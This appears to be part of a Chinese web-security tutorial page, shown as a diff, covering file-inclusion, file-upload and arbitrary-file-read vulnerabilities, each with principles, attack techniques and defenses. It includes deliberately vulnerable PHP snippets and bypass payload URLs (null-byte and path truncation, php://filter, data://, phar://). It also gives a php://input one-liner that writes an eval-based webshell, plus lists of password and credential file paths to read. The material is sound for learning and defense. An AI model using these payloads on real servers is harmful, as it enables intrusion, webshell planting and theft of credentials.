+<li>对PHP语言来说，不能完全控制的危险函数最 好不要使用 </li>
+<li>能使用脚本解决的工作，不要调用其他程序处 理。尽量少用执行命令的函数，并在disable_ functions中禁用 </li>
+<li>对于可控点是程序参数的情况下，使用 escapeshellcmd函数进行过滤，对于可控点是 程序参数值的情况下，使用escapeshellarg函数 进行过滤 </li>
+<li>在使用动态函数之前，确保使用的函数是指定 的函数之一 </li>
+<li>而针对由特定第三方组件引发的漏洞，我们要 做的就是及时打补丁，修改安装时的默认配置。<h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><a href="https://xz.aliyun.com/t/2741" target="_blank" rel="noopener">远程命令执行</a><br><a href="https://www.freebuf.com/articles/web/262005.html" target="_blank" rel="noopener">远程代码执行</a><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2></li>
+</ol>
+<p><strong>包含</strong><br>开发人员通常会把重复使用的函数写到单个文件 中，使用时直接调用此文件，而无需再次编写， 这种调用文件的过程一般称为包含。</p>
+<p>服务器执行PHP文件时，可以通过文件包含函数 加载另一个文件中的PHP代码，并且当PHP来执 行，这会为开发者节省大量的时间。这意味着您 可以创建供所有网页引用的标准页眉或菜单文 件。当页眉需要更新时，您只更新一个包含文件 就可以了，或者当您向网站添加一张新页面时， 仅仅需要修改一下菜单文件（而不是更新所有网 页中的链接）。</p>
+</li>
+</ul>
+<p><strong>为什么造成文件包含漏洞</strong><br>因为将被包含的文件设置为变量，用来进行动态 调用。正是这种灵活性， 从而导致客户端可以调 用一个恶意文件，造成文件包含漏洞。</p>
+<p> 文件包含函数的参数没有经过过滤，可以被攻击 者控制，包含其他恶意文件，导致了执行恶意的 代码。 </p>
+<p>文件包含函数加载的参数没有经过过滤或者严格 的定义，可以被用户控制，包含其他恶意文件， 导致了执行了非预期的代码。<br><strong>本地文件包含</strong><br>能够打开并包含本地文件的漏洞,被称为本地文件 包含漏洞( Local file inclusion,简称LFI).比如下 面这段代码,就存在LFI漏洞.<br><strong>远程文件包含</strong><br>如果PHP的配置选项 allow url include为ON的 话,则 include/require函数是可以加载远程文件 的,这种漏洞被称为远程文件包含漏洞( Remote File Inclusion,简称RFⅠ)。</p>
+<p>如果远程文件没经过严格的过滤，导致了执行恶 意文件的代码，这就是远程文件包含漏洞。</p>
+<p>允许远程文件包含的配置文件修改内容：</p>
+<ul>
+<li>allow_url_fopen = On（是否允许打开远程文件) </li>
+<li>allow_url_include = On（是否允许include/ require远程文件）</li>
+</ul>
+<h2 id="攻击-4"><a href="#攻击-4" class="headerlink" title="攻击"></a>攻击</h2><h3 id="PHP中文件包含的函数"><a href="#PHP中文件包含的函数" class="headerlink" title="PHP中文件包含的函数"></a>PHP中文件包含的函数</h3><p><strong>include()：找不到被包含文件，报错，但会继续 运行脚本</strong><br> include和require区别主要是，include在包含 的过程中如果出现错误，会抛出一个警告，程序 继续正常运行；而require函数出现错误的时候， 会直接报错并退出程序的执行。<br>  <strong>require()：找不到被包含文件，报错，并且停止 运行脚本；</strong><br>  <strong>include_once()：与include（）类似，区别在 于，当重复调用同一文件时，程序只调用一次；</strong><br>  include_once()和require_once()这两个函数只 包含一次，适用于在脚本执行期想确保它只被包 括一次以避免函数重定义，变量重新赋值等问 题。<br>   <strong>require_once() ：与require类似，区别在于， 当重复调用同一文件时，程序只调用一次；</strong><br>   当使用这四个函数包含一个新的文件时，该文件 将作为PHP代码执行，PHP内核并不会在意该包 含的文件是什么类型。（无论是txt、图片文件， 远程URL，全都作为PHP代码执行）</p>
+<h3 id="文件包含的特性"><a href="#文件包含的特性" class="headerlink" title="文件包含的特性"></a>文件包含的特性</h3><p>   ?page=<br>   ?file=<br>   ?home=</p>
+<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><ol>
+<li>included等函数通过动态变量的方式引入需要 包含的文件; </li>
+<li>用户能够控制该动态变量. </li>
+<li>被包含的文件可被访问<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h4></li>
+</ol>
+<p>   <strong>无限制本地文件包含</strong><br>   测试代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>]; </span><br><span class="line"><span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过目录遍历漏洞可以获取到系统中其他文件的 内容<br><strong>session文件包含漏洞</strong><br>利用条件：session的存储位置可以获取</p>
+<ol>
+<li>通过phpinfo的信息可以获取到session的存储 位置。<br>通过phpinfo的信息，获取到session.save_path 为/var/lib/php/session： </li>
+<li>通过猜测默认的session存放位置进行尝试。<br>如linux下默认存储在/var/lib/php/session目 录下<br>session中的内容可以被控制，传入恶意代码。<h4 id="有限制本地文件包含绕过"><a href="#有限制本地文件包含绕过" class="headerlink" title="有限制本地文件包含绕过"></a>有限制本地文件包含绕过</h4><strong>%00截断</strong><br>条件：magic_quotes_gpc = Off php版本&lt;5.3.4<br>测试代码：</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>]; </span><br><span class="line"><span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>测试结果：<br><code>http://www.ctfs-wiki.com/FI/FI.php? filename=../../../../../../../boot.ini%00</code><br><strong>路径长度截断</strong><br>条件：windows OS，点号需要长于256；linux OS 长于4096</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>http://www.ctfs-wiki.com/FI/FI.php? filename=test. txt/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././</code><br>只要够长，就拦不住😏</p>
+<p>Windows下目录最大长度为256字节，超出的部 分会被丢弃；</p>
+<p>Linux下目录最大长度为4096字节，超出的部分 会被丢弃。</p>
+<p><strong>点号截断</strong><br>条件：windows OS，点号需要长于256<br>测试代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>http://www.ctfs-wiki.com/FI/FI.php? filename=test. txt.............................................................................................................................................................................................................................................................................................................................................................................................................................</code></p>
+<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><strong>PHP的配置文件allow_url_fopen和allow_url_ include设置为ON，include/require等包含函 数可以加载远程文件，如果远程文件没经过严格 的过滤，导致了执行恶意文件的代码，这就是远 程文件包含漏洞。</strong></p>
+<ul>
+<li>allow_url_fopen = On（是否允许打开远程文 件）</li>
+<li>allow_url_include = On（是否允许include/ require远程文件）</li>
+</ul>
+<p><strong>无限制远程文件包含漏洞</strong><br>代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>]; <span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>通过远程文件包含漏洞，包含php.txt可以解析。<br>例：<code>http://www.ctfs-wiki.com/FI/FI.php?filename=http://192.168.91.133/FI/php.txt</code></p>
+<p><strong>有限制远程文件包含</strong><br>测试代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>($_GET[<span class="string">'filename'</span>] . <span class="string">".html"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>代码中多添加了html后缀，导致远程包含的文件 也会多一个html后缀。</p>
+<p> 问号绕过 <code>http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt?</code></p>
+<p> #号绕过 <code>http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%23</code></p>
+<p>空格绕过 <code>http://www.ctfs-wiki.com/FI/WFI.php?filename=http://192.168.91.133/FI/php.txt%20</code></p>
+<h3 id="常见的敏感信息路径"><a href="#常见的敏感信息路径" class="headerlink" title="常见的敏感信息路径"></a>常见的敏感信息路径</h3><p><strong>windows</strong><br>c:\boot.ini // 查看系统版本<br>c:\windows\system32\inetsrv\MetaBase. xml // IIS配置文件<br> c:\windows\repair\sam // 存储Windows系 统初次安装的密码<br> c:\ProgramFiles\mysql\my.ini // MySQL配 置<br> c:\ProgramFiles\mysql\data\mysql\user. MYD // MySQL root密码<br>  c:\windows\php.ini // php 配置信息</p>
+<p><strong>Linux</strong><br>/etc/passwd // 账户信息<br>/etc/shadow // 账户密码文件<br>/usr/local/app/apache2/conf/httpd. conf // Apache2默认配置文件<br>/usr/local/app/apache2/conf/extra/ httpd-vhost.conf // 虚拟网站配置<br>/usr/local/app/php5/lib/php.ini // PHP相 关配置<br>/etc/httpd/conf/httpd.conf // Apache配置 文件<br>/etc/my.conf // mysql 配置文件</p>
+<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><p><strong>PHP 带有很多内置 URL 风格的封装协议，可用 于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议， 还能通过 stream_wrapper_register() 来注册自 定义的封装协议。</strong><br><strong>1、php://输入输出流</strong><br>PHP 提供了一些杂项输入/输出（IO）流，允许 访问 PHP 的输入输出流、标准输入输出和错误 描述符， 内存中、磁盘备份的临时文件流以及可 以操作其他读取写入文件资源的过滤器。</p>
+<p><strong>2、php://filter（本地磁盘文件进行读取）</strong></p>
+<ul>
+<li><p>元封装器，设计用于”数据流打开”时的”筛选过滤 ”应用，对本地磁盘文件进行读写。<br>条件：只是读取，需要开启 allow_url_fopen， 不需要开启 allow_url_include；</p>
+</li>
+<li><p>用法一样。：<br><code>?filename=php://filter/convert.base64-encode/resource=xxx.php</code><br><code>?filename=php://filter/read=convert.base64-encode/resource=xxx.php</code></p>
+</li>
+</ul>
+<p><strong>3、php://input</strong></p>
+<ul>
+<li>可以访问请求的原始数据的只读流。即可以直接 读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</li>
+<li>用法：?file=php://input 数据利用POST传过 去。</li>
+</ul>
+<p><strong>4、php://input （读取POST数据）</strong></p>
+<ul>
+<li>碰到file_get_contents()就要想到用php:// input绕过，因为php伪协议也是可以利用http协 议的，即可以使用POST方式传数据，具体函数 意义下一项；<br>测试代码：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> file_get_contents(<span class="string">"php://input"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>5、php://input（写入木马）</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>条件：php配置文件中需同时开启 allow_url_ fopen 和 allow_url_include（PHP &lt; 5.3.0）,就 可以造成任意代码执行，在这可以理解成远程文 件包含漏洞（RFI），即POST过去PHP代码，即 可执行。</p>
+<p>如果POST的数据是执行写入一句话木马的PHP 代码，就会在当前目录下写入一个木马。</p>
+<ol>
+<li><code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @ eval($_POST[cmd])?&gt;&#39;);?&gt;</code></li>
+<li>如果不开启allow_url_include会报错</li>
+</ol>
+<p><strong>6、php://input（命令执行）</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>条件：php配置文件中需同时开启 allow_url_ fopen 和 allow_url_include（PHP &lt; 5.30）,就 可以造成任意代码执行，在这可以理解成远程文 件包含漏洞（RFI），即POST过去PHP代码，即 可执行；<br>如果不开启allow_url_include会报错</p>
+<p><strong>7、file://伪协议 （读取文件内容）</strong><br>通过file协议可以访问本地文件系统，读取到文件的内容</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>8、data://伪协议</strong><br>数据流封装器，和php://相似都是利用了流的概 念，将原本的include的文件流重定向到了用户 可控制的输入流中，简单来说就是执行文件的包 含方法包含了你的输入流，通过你输入payload 来实现目的； <code>data://text/plain;base64, dGhlIHVzZXIgaXMgYWRtaW4</code></p>
+<p>data://（读取文件）</p>
+<ul>
+<li>和php伪协议的input类似，碰到file_get_ contents()来用；<br><code>&lt;?php // 打印 “I love PHP” echo file_get_contents(‘data://text/plain; base64,SSBsb3ZlIFBIUAo=’); ?&gt;</code></li>
+<li>注意：&lt; span style=”color: rgb(121, 121, 121);”&gt;&lt; ?php phpinfo();,这类执行代码最后没 有?&gt;&lt; /span&gt;闭合;</li>
+<li>如果php.ini里的allow_url_include=On（PHP &lt; 5.3.0）,就可以造成任意代码执行，同理在这就可 以理解成远程文件包含漏洞（RFI）</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>9、phar://伪协议</strong><br>这个参数是就是php解压缩包的一个函数，不管 后缀是什么，都会当做压缩包来解压。</p>
+<p>用法：?file=phar://压缩包/内部文件 phar:// xxx.png/shell.php 注意： PHP &gt; =5.3.0 压缩包 需要是zip协议压缩，rar不行，将木马文件压缩 后，改为其他任意格式的文件都可以正常使用。 步骤： 写一个一句话木马文件shell.php，然后 用zip协议压缩为shell.zip，然后将后缀改为png 等其他格式。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>10、zip://伪协议</strong><br>zip伪协议和phar协议类似，但是用法不一样。</p>
+<p>用法：?file=zip://[压缩文件绝对路径]#[压缩文 件内的子文件名] zip://xxx.png#shell.php</p>
+<p>条件： PHP &gt; =5.3.0，注意在windows下测试要 5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为% 23，否则浏览器默认不会传输特殊字符。</p>
+<h2 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h2><p><strong>1、包含文件的参数过滤</strong><br>① 文件名过滤：白名单或者黑名单过滤；<br> ②不使用动态变量进行包含操作，设置字典等静 态处理。<br> ③文件名后缀固定</p>
+<p> <strong>2、路径限制</strong><br> ①目录限制，在用户提交的变量前增加固定的路 径，限制用户可调用的目录范围；<br>  ②目录回退符过滤，避免回退符生效导致路径变 化；</p>
+<p><strong>3、中间件的安全配置</strong><br>①PHP版本小于5.4在php.ini中设置magic_ quotes_gpc=on(5.4 以后被放弃用) </p>
+<ul>
+<li>magic_quotes_gpc设置是否自动为GPC(get, post,cookie)传来的数据中的’”\加上反斜线。</li>
+</ul>
+<p>②限制访问区域：php.ini 中设置 open_basedir 来限制用户访问文件的活动范围等；apache 也 有相关配置<br>③设置访问权限：限制当前中间件所在用户的访 问权限，例如；web 服务器独立用户，并且只拥 有访问目录和使用中间件的权限，从而有效避免 越权访问其他文件；</p>
+<p><strong>4、搭建RASP阻止代码注执行</strong></p>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p><strong>原理小结</strong><br>文件上传漏洞是指网络攻击者上传了一个可执行 的文件到服务器并执行。这里上传的文件可以是 木马，病毒，恶意脚本或者WebShell等。</p>
+<p>由于程序员在对用户文件上传部分的控制不足或 者处理缺陷，而导致用户可以越过其本身权限向 服务器上传可执行的动态脚本文件。</p>
+<p><strong>原理总结</strong><br>大部分的网站和应用系统都有上传功能，而程序 员在开发任意文件上传功能时，并未考虑文件格 式后缀的合法性校验或者是否只在前端通过js进 行后缀检验。</p>
+<p>这时攻击者可以上传一个与网站脚本语言相对应 的恶意代码动态脚本，例如(jsp、asp、php、 aspx文件后缀)到服务器上，从而访问这些恶意 脚本中包含的恶意代码，进行动态解析最终达到 执行恶意代码的效果，进一步影响服务器安全。</p>
+<h2 id="危害-3"><a href="#危害-3" class="headerlink" title="危害"></a>危害</h2><p>上传漏洞与SQL注入或 XSS相比，其风险更大， 如果 Web应用程序存在上传漏洞，攻击者上传 的文件是Web脚本语言，服务器的Web容器解 释并执行了用户上传的脚本，导致代码执行。如 果上传的文件是Flash的策略文件crossdomain. xml，黑客用以控制Flash在该域下的行为。</p>
+<p>如果上传的文件是病毒、木马文件，黑客用以诱 骗用户或者管理员下载执行。如果上传的文件是 钓鱼图片或为包含了脚本的图片，在某些版本的 浏览器中会被作为脚本执行，被用于钓鱼和欺 诈。甚至攻击者可以直接上传一个webshell到服 务器上 完全控制系统或致使系统瘫痪。</p>
+<h2 id="攻击-5"><a href="#攻击-5" class="headerlink" title="攻击"></a>攻击</h2><p><strong>满足条件</strong></p>
+<ol>
+<li>文件上传功能能正常使用 </li>
+<li>上传文件路径可知 </li>
+<li>上传文件可以被访问 </li>
+<li>上传文件可以被执行或被包含</li>
+</ol>
+<p><strong>数据包分析</strong><br>Content-Length：即上传内容大小<br>MAX_FILE_SIZE：即上传内容的最大长度<br>Filename：即上传文件名<br>Content-Type：即上传文件类型 请求包中的乱码字段，即是所上传文件的内容</p>
+<p><strong>测试过程</strong></p>
+<ol>
+<li>进行正常的上传，期间可抓包查看 </li>
+<li>尝试上传不同类型的恶意脚本文件，如JSP PHP文件等 </li>
+<li>查看是否在前端做了上传限制，如大小，格 式，并尝试进行绕过 </li>
+<li>利用报错或者猜测等方式获得木马路径，访问</li>
+</ol>
+<h3 id="漏洞利用技巧"><a href="#漏洞利用技巧" class="headerlink" title="漏洞利用技巧"></a>漏洞利用技巧</h3><h4 id="客户端校验（js）"><a href="#客户端校验（js）" class="headerlink" title="客户端校验（js）"></a>客户端校验（js）</h4><p>一般是在网页上写一段Js脚本，用Js去检测，校 验上传文件的后缀名的合法性问题。 在检查扩展名是否合法的时候，有两种策略：白 名单策略和黑名单策略。 判断方式： 在浏览加载文件，但还未点击上传按钮时便弹出 对话框，内容如：只允许上传.jpg/.jpeg/.png后 缀名的文件，而此时并没有发送数据包，所以可 以通过抓包来判断，如果弹出不准上传，但是没 有抓到数据包，那么就是前端验证。其实，也可 以直接查看网页源代码，源代码中如果没有js前 端效验，那么就一定是后端效验喽。 绕过方法： 这个限制是在客户端进行的，这种限制形同虚 设。传正常文件改数据包就可以绕过，甚至关闭 JS都可以尝试绕过。 黑白名单机制： 黑名单：不允许上传什么，文件扩展名在黑名单 中的为不合法。 白名单：只允许上传什么，文件扩展名不在白名 单中的均为不合法。 白名单比黑名单更安全</p>
+<h4 id="服务端检测"><a href="#服务端检测" class="headerlink" title="服务端检测"></a>服务端检测</h4><p>检查Content-Type （内容类型） 检查后缀 （检查后缀是主流） 绕过方法：假如将webshell代码文件后缀改为其 它被服务器认为是安全的后缀，再通过解析漏洞 让其按照脚本文件进行解析，就达到了最终的目 的。</p>
+<p><strong>服务端MIME检测绕过（Content-Type检测）</strong><br>HTTP协议规定了上传资源的时候在Header中加 上一项文件的MIMETYPE，来识别文件类型，这 个动作是由浏览器完成的，服务端可以检查此类 型不过这仍然是不安全的,因为HTTP header可以 被发出者或者中间人任意的修改，不过加上一层 防护也是可以有一定效果的。</p>
+<p>绕过方法：使用burp代理，修改Content-Type 的参数。</p>
+<p><strong>服务端扩展名检测绕过</strong></p>
+<ul>
+<li>在文件被上传到服务端的时候，对于文件名的扩 展名进行检查，如果不合法，则拒绝这次上传。 在检查扩展名是否合法的时候，有两种策略：黑 名单策略和白名单策略。</li>
+<li>白名单策略是更加安全的，通过限制上传类型为 只有我们接受的类型，可以较好的保证安全，因 为黑名单我们可以使用各种方法来进行注入和突 破。</li>
+<li><strong>绕过方法</strong><br>件名后缀名字双写嵌套，例如pphphp，asaspp等 可以利用系统会对一些特殊文件名做默认修改 的系统特性绕过 可以利用asp程序中的漏洞，使用截断字符绕 过可以利用不再黑名单列表中却能够成功执行的 同义后缀名绕过黑名单的限制。 可以利用解析/包含漏洞配合上传一个代码注 入过的白名单文件绕过。</li>
+</ul>
+<ol>
+<li>.老版本的IIS中的目录解析漏洞，如果网站目录 中有一个 /.asp/目录，那么此目录下面的一切 内容都会被当作asp脚本来解析 </li>
+<li>老版本的IIS中的分号漏洞：IIS在解析文件名的 时候可能将分号后面的内容丢弃，那么我们可以 在上传的时候给后面加入分号内容来避免黑名单 过滤，如 a.asp;jpg </li>
+<li>旧版Windows Server中存在空格和dot漏洞类 似于 a.php. 和 a.php[空格] 这样的文件名存储后 会被windows去掉点和空格，从而使得加上这两 个东西可以突破过滤，成功上传，并且被当作 php代码来执行 </li>
+<li>nginx空字节漏洞 xxx.jpg%00.php 这样的文件 名会被解析为php代码运行 </li>
+<li>apache的解析漏洞，上传如a.php.rar a.php. gif 类型的文件名，可以避免对于php文件的过滤 机制，但是由于apache在解析文件名的时候是 从右向左读，如果遇到不能识别的扩展名则跳 过，rar等扩展名是apache不能识别的，因此就 会直接将类型识别为php，从而达到了注入php 代码的目的</li>
+</ol>
+<p><strong>服务端文件头内容检测绕过</strong></p>
+<ul>
+<li>这种方法利用的是每一个特定类型的文件都会有 不太一样的开头或者标志位。可以通过比如php 的exif_imagetype()函数来检测。 通过检查头几位字节，可以分辨是否是图片文 件。不同类型的文件都有对应的文件类型签名（也叫 类型幻数，简称文件头），比如，PNG 的文件头 为十六进制的 89 50 4E 47 0D 0A 1A 0A；GIF 为 47 49 46 38 37 61、JPG 为 FF D8 FF E0。</li>
+<li>通过在文件中添加正常文件的标识或其他关键字 符绕过。 给上传脚本加上相应的幻数头字节就可以，php 引擎会将 &lt;?之前的内容当作html文本，不解析 直接跳过，后面的代码仍然能够得到执行。 其他类型的二进制文件，也有相应的头字节。</li>
+<li>文件加载检测绕过，针对渲染加载测试。 代码注入绕过，针对二次渲染测试。</li>
+</ul>
+<h2 id="防御-6"><a href="#防御-6" class="headerlink" title="防御"></a>防御</h2><p>1 对上传的文件在服务器上存储时进行重命名<br>2 检查上传文件的类型和大小、<br>3 禁止上传危险的文件类型，如jsp jar war等<br>4 直接受指定类型的文件<br> 5 上传文件做日志记录<br> 6 上传文件要保存的文件名和目录名由系统根据 时间生成，不允许用户自定义</p>
+<h1 id="任意文件读取与下载"><a href="#任意文件读取与下载" class="headerlink" title="任意文件读取与下载"></a>任意文件读取与下载</h1><h2 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h2><p><strong>在web安全中，任意文件读取漏洞是非常常见的 一种漏洞，属于文件操作类漏洞，一般常见于 PHP/java/python语言中，任意文件读取漏 洞，顾名思义，就是可以任意读取服务器上部分 或者全部文件的漏洞，攻击者利用此漏洞可以读 取服务器敏感文件如/etc/passwd,/etc/ sadow,web.config。漏洞一般存在于文件下载 参数，文件包含参数。主要是由于程序对传入的 文件名或者文件路径没有经过合理的校验，从而 操作了预想之外的文件，导致意外的文件泄露。</strong><br>任意文件读取漏洞的原理其实就是由于程序对客 户端传入的参数未作合法性的检验造成的，举了 例子：在业务常见中存在一个url: <a href="http://www.download.com/index.php?filename=code.php" target="_blank" rel="noopener">http://www.download.com/index.php?filename=code.php</a> 此URL的业务功能主要是包含进code.php文件 中的程序代码，然后在index.php文件中执行相 关的代码，但是由于filename参数未作校验，攻 击者可以构造url : <a href="http://www.download.com/index.php?filename=c:\windows\win.ini" target="_blank" rel="noopener">http://www.download.com/index.php?filename=c:\windows\win.ini</a> 或者构造 <a href="http://www.download.com/index.php?filename=/etc/shadow" target="_blank" rel="noopener">http://www.download.com/index.php?filename=/etc/shadow</a> ， 然后去访问，结果攻击者就读取到了win.ini内容 和操作系统shadow,对于操作系统的shadow文 件，大家应该比较清楚，是保存操作系统密码串 的文件，这样攻击者就可以对密码串进行破解， 获取到操作系统的SSH密码。 以上例子说明任意文件读取/下载的漏洞产生原 理主要就是对参数未进行合法性校验造成的。另 外还有一些如PHP语言的PHP流input和filter以 及data的URLs远程文件包含漏洞造成的任意文 件读取漏洞。</p>
+<h2 id="危害-4"><a href="#危害-4" class="headerlink" title="危害"></a>危害</h2><p>通过任意文件下载，可以下载服务器的任意文 件，web业务的代码，服务器和系统的具体配置 信息，也可以下载数据库的配置信息，以及对内 网的信息探测等等</p>
+<h2 id="攻击-6"><a href="#攻击-6" class="headerlink" title="攻击"></a>攻击</h2><h3 id="利用方式-3"><a href="#利用方式-3" class="headerlink" title="利用方式"></a>利用方式</h3><p>任意文件读取/下载漏洞的利用方式比较简单， 但也要看web系统的实际情况来读取下载文件， 对于weblogic中间件，如果攻击者想通过任意文 件读取漏洞Getshell,那攻击者可以利用任意文件 读取漏洞下载weblogic的密码文件和filter，然 后破解console控制台密码，部署shell;对于 tomcat中间件，利用任意文件下载漏洞读取控制 台密码文件tomcat-users.xml ，下载到管理台 密码后就可以部署shell了，总之，任意文件下载 漏洞的利用方式要看实际情况，下载文件一般利 用有：配置文件读取，代码审计，信息收集， getshell等，常见的任意文件下载/读取漏洞的<br><strong>利用方式有以下几种：</strong></p>
+<ol>
+<li>读取程序源代码（如密码配置文件） </li>
+<li>读取程序配置文件（如数据库连接文件） </li>
+<li>读取操作系统关键文件（如/etc/sadow，/ root/.bash_history等文件） </li>
+<li>读取运维配置文件（redis/rsync/ftp/ssh客 户端数据等） </li>
+<li>读取中间件配置文件（weblogic/tomcat等 密码文件，apache的httpd.conf文件） </li>
+<li>下载web日志文件（获取网站后台/上传文件 等）</li>
+<li>结合SSRF获取内网机器文件</li>
+</ol>
+<h3 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h3><p>任意文件读取漏洞的挖掘一般只能手工进行测 试，常见的web扫描器很难发现此类漏洞，主要 因为任意文件读取漏洞大多数在登录状态的各种 业务场景下面，甚至出现在APP类的程序中，所 以此类漏洞只能根据业务场景，参数名称等方式 进行手工测试。对于任意文件下载漏洞的 payload构造，情况比较多，最为常见的 payload类似于../../../../../../这样的通道符，当 然还有一些程序做了限制的，如%00截断，路径 长度截断，点号截断等。<br><strong>常见的任意文件读取漏 洞挖掘有以下几种：</strong><br><strong>白盒</strong><br>任意文件挖掘通过代码审计的方式挖掘，此类挖 掘漏洞的方式我们可以搜索关键词，如 download，filename,file,name，dir等与文件 操作相关的代码段，然后找出对应的处理函数看 是否做了过滤和限制等。白盒审计任意文件读取 的漏洞我们就不需要每一行代码都去看，既然审 计目的是找出是否有文件读取和文件下载的漏 洞，那么只要找出相关的业务功能代码即可进行 挖掘。这里白盒审计的敏感字段常见有 RealPath，FilePath，filepath，Path，path， inputFile，url，urls，Lang，dis，data， readfile，filep，src，menu，file，name， filename，input等</p>
+<p><strong>黑盒</strong><br>黑盒挖掘任意文件下载的漏洞其实就是渗透测试 了，黑盒相对于白盒审计而言，就是看不到代码 段，不知道程序对文件名参数是否做了处理，那 么就需要通过各种文件读取的payload fuzz了。 黑盒挖掘文件下载读取漏洞，在web业务上面我 们可以寻找文件的下载点，图片加载点，路径写 入点等，如/getpiptureActionload.action? filename=xxxxx.docx&amp;random=111,那么我们在 测试的时候就可以构造： getpiptureActionload.action? filename=../../../../../../../../../.etc/passwd&amp; random=111这样的url进行漏洞挖掘，当然不同 的操作系统，构造方式有所不同。</p>
+<p><strong>灰盒</strong><br>这里的灰盒我们理解为黑盒+白盒的方式，这种挖 掘方法非常有效，也非常的省时省力，例如我们 在业务上面找到了文件下载点，然后去阅读代码 看是否做了处理，如果做了处理结合代码规则进 行绕过测试，如果未作限制，直接利用即可。</p>
